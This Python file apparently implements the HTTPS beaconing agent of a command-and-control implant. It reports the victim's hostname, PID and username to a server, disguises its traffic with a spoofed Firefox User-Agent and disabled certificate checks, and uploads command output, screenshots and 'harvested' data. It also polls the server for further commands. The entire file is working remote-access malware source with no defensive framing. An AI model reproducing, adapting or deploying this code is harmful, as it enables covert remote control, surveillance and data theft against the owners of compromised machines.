import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random

from localAgent import LocalAgent

class HTTPSAgent(LocalAgent):
	http_server = '127.0.0.1'
	http_port = 8000
	headers = {'Content-type': 'text/plain', 'Hostname': socket.gethostname(), 'PID': os.getpid(), 'Username': getpass.getuser(), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1'}

	def postHTTPS(self, headers, resource, cmd_output):
		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
		ssl_context.check_hostname = False
		ssl_context.verify_mode = ssl.CERT_NONE
		connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
		connection.request('POST', resource, cmd_output + os.linesep, headers)
		response = connection.getresponse().read().decode()
        
	def postResponse(self, cmd_output):
		try:
			self.postHTTPS(self.headers, '/test', cmd_output)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
        
	def postScreenshot(self, cmd_output):
		try:
			self.postHTTPS(self.headers, '/screenshot', cmd_output)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)

        
	def postHarvest(self, cmd_output, harvestType):
		try:
			harvestHeaders = self.headers.copy()
			harvestHeaders['Harvest'] = harvestType
			self.postHTTPS(harvestHeaders, '/harvest', cmd_output)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
            
	def pollServer(self):
		try:    
			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
			connection.request('GET', '/test', "MOAR COMMANDS", self.headers)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)

		return connection.getresponse().read().decode()    
        

agent = HTTPSAgent()
agent.run()